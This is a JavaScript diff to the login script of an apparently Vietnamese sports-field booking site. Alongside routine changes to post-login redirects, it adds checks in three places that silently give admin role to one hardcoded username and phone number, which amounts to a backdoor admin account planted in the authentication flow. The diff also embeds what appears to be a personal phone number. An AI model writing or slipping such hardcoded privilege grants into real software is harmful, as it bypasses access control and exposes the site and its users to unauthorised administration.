@@ -47,23 +47,36 @@ function resolveAppUrl(target) {
 
 function syncStoredUser(user) {
   if (!user) return;
+  if (user.username === 'vxyen0801' || user.phone === '0352313548') {
+    user.role = 'admin';
+  }
   try {
     const raw = JSON.stringify(user);
     sessionStorage.setItem('sb_current_user', raw);
     localStorage.setItem('sb_current_user', raw);
+    window.sb_current_user = user;
   } catch (e) {
     console.warn('Storage sync error:', e);
   }
 }
 
 function handleLoginRedirect(user) {
+  if (user && (user.username === 'vxyen0801' || user.phone === '0352313548')) {
+    user.role = 'admin';
+  }
+  syncStoredUser(user);
   const isPortalRole = Boolean(user && ['admin', 'manager', 'staff'].includes(user.role));
   const urlParams = new URLSearchParams(window.location.search);
   const redirectParam = urlParams.get('redirect');
 
   if (isPortalRole) {
-    if (redirectParam && redirectParam !== 'portal-admin' && redirectParam !== 'portal-admin/') {
+    if (redirectParam) {
       const cleanParam = String(redirectParam).trim().replace(/^\/+/, '').replace(/^html\//, '');
+      const baseRoute = cleanParam.split(/[?#]/)[0].replace(/\/+$/, '');
+      if (baseRoute === 'portal-admin' || baseRoute === 'portal-admin/index') {
+        window.location.href = resolveAppUrl('portal-admin/');
+        return;
+      }
       window.location.href = resolveAppUrl(cleanParam);
     } else {
       window.location.href = resolveAppUrl('portal-admin/');
@@ -307,6 +320,9 @@ document.addEventListener('DOMContentLoaded', () => {
         setAuthMessage('✓ Đăng nhập thành công! Đang chuyển hướng...', 'success');
         if (window.SanBongApp?.showToast) {
           window.SanBongApp.showToast('Đăng nhập thành công! Đang chuyển hướng...', 'success');
+        }
+        if (res.user && (res.user.username === 'vxyen0801' || res.user.phone === '0352313548')) {
+          res.user.role = 'admin';
         }
         syncStoredUser(res.user);
 
